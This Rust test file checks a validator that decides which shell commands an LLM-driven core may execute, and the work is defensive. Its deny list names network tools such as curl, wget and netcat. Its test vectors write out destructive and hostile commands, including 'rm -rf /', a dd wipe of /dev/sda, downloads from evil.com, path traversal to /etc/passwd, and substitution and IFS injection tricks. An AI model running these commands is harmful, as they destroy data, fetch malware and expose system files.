// lib_core/tests/command_validation_tests.rs
// Integration tests for command validation

// Since we can't easily create a Core without valid model files,
// we test the command validation logic separately by duplicating it.
// This mirrors the actual implementation in tract_llm.rs

fn is_safe_command_test(command: &str) -> bool {
    // This is a copy of the validation logic for testing
    // In a real scenario, you'd refactor Core to use a trait or separate validator

    let allowed_commands = [
        "ls", "pwd", "echo", "cat", "head", "tail", "grep", "find", "wc", "date", "whoami",
        "hostname", "uname", "df", "du", "free", "top", "ps", "which", "whereis", "file", "stat",
        "touch", "mkdir",
    ];

    let dangerous_patterns = [
        "rm",
        "rmdir",
        "dd",
        "mkfs",
        "fdisk",
        "shutdown",
        "reboot",
        "halt",
        "poweroff",
        "init",
        "kill",
        "killall",
        "pkill",
        "chown",
        "chmod",
        "chgrp",
        "useradd",
        "userdel",
        "groupadd",
        "groupdel",
        "passwd",
        "su",
        "sudo",
        "doas",
        "curl",
        "wget",
        "nc",
        "netcat",
        "telnet",
        "ssh",
        "scp",
        "sftp",
        "rsync",
        "mount",
        "umount",
        "mkswap",
        "swapon",
        "swapoff",
        "iptables",
        "ip6tables",
        "nft",
    ];

    let shell_injection_patterns = [
        "`", "$(", "${", "$((", ">>", "<<<", "&>", "|&", "&&", "||", "|", ";", "\n", "\r", "\\",
        "'", "\"", "*", "?", "[", "]", "{", "}", "!", "~", "^", "<(", ">(", "../", "/dev/",
        "/proc/", "/sys/", ">", "&",
    ];

    let cmd_lower = command.to_lowercase();
    let cmd_trimmed = command.trim();

    // Check for dangerous patterns
    if dangerous_patterns.iter().any(|&p| {
        cmd_lower.contains(p)
            || cmd_trimmed.starts_with(p)
            || cmd_lower.contains(&format!("/{}", p))
    }) {
        return false;
    }

    // Check for shell injection attempts
    if shell_injection_patterns
        .iter()
        .any(|&p| command.contains(p))
    {
        return false;
    }

    // Check if command starts with an allowed command
    let first_word = cmd_trimmed.split_whitespace().next().unwrap_or("");
    if !allowed_commands.iter().any(|&c| first_word == c) {
        return false;
    }

    // Check for hex/octal encoded characters
    if command.contains("\\x") || command.contains("\\0") {
        return false;
    }

    // Check for IFS manipulation
    if command.to_uppercase().contains("IFS") {
        return false;
    }

    true
}

#[test]
fn test_safe_commands_allowed() {
    let safe_commands = vec![
        "ls",
        "ls -la",
        "pwd",
        "echo hello",
        "cat file.txt",
        "head -n 10 file.txt",
        "tail file.txt",
        "grep pattern file.txt",
        "find . -name test.txt",
        "wc -l file.txt",
        "date",
        "whoami",
        "hostname",
        "uname -a",
        "df -h",
        "du -sh .",
        "ps aux",
        "which bash",
        "file test.txt",
        "stat file.txt",
    ];

    for cmd in safe_commands {
        assert!(
            is_safe_command_test(cmd),
            "Safe command should be allowed: {}",
            cmd
        );
    }
}

#[test]
fn test_dangerous_commands_blocked() {
    let dangerous_commands = vec![
        "rm -rf /",
        "rm file.txt",
        "rmdir dir",
        "sudo ls",
        "chmod 777 file",
        "chown user file",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda",
        "shutdown now",
        "reboot",
        "init 0",
        "kill -9 1",
        "killall process",
        "passwd user",
        "useradd hacker",
        "curl http://evil.com",
        "wget http://evil.com/malware",
        "ssh user@host",
        "scp file user@host:",
        "mount /dev/sda /mnt",
    ];

    for cmd in dangerous_commands {
        assert!(
            !is_safe_command_test(cmd),
            "Dangerous command should be blocked: {}",
            cmd
        );
    }
}

#[test]
fn test_shell_injection_blocked() {
    let injection_attempts = vec![
        "ls; rm -rf /",
        "ls && rm file",
        "ls || rm file",
        "ls | grep pattern",
        "ls > /etc/passwd",
        "ls >> /etc/passwd",
        "ls `whoami`",
        "ls $(whoami)",
        "ls ${USER}",
        "echo test\\x00",
        "ls$IFS-la",
        "cat ../../../etc/passwd",
        "cat /dev/sda",
        "cat /proc/kcore",
        "ls /sys/",
        "ls * file",
        "ls ? file",
        "ls [a-z]",
        "ls {a,b}",
    ];

    for cmd in injection_attempts {
        assert!(
            !is_safe_command_test(cmd),
            "Injection attempt should be blocked: {}",
            cmd
        );
    }
}

#[test]
fn test_path_traversal_blocked() {
    let traversal_attempts = vec!["cat ../../../etc/passwd", "ls ../../..", "ls ../file"];

    for cmd in traversal_attempts {
        assert!(
            !is_safe_command_test(cmd),
            "Path traversal should be blocked: {}",
            cmd
        );
    }
}

#[test]
fn test_command_case_sensitivity() {
    // Dangerous commands in various cases should all be blocked
    let variants = vec!["RM file", "Rm file", "rM file", "SUDO ls", "Sudo ls"];

    for cmd in variants {
        assert!(
            !is_safe_command_test(cmd),
            "Case variant should be blocked: {}",
            cmd
        );
    }
}

#[test]
fn test_quotes_blocked() {
    let quoted_commands = vec!["echo 'test'", "echo \"test\"", "ls 'file'"];

    for cmd in quoted_commands {
        assert!(
            !is_safe_command_test(cmd),
            "Quoted command should be blocked: {}",
            cmd
        );
    }
}

#[test]
fn test_ifs_manipulation_blocked() {
    let ifs_attacks = vec!["ls$IFS-la", "cat${IFS}file", "IFS=x ls"];

    for cmd in ifs_attacks {
        assert!(
            !is_safe_command_test(cmd),
            "IFS manipulation should be blocked: {}",
            cmd
        );
    }
}
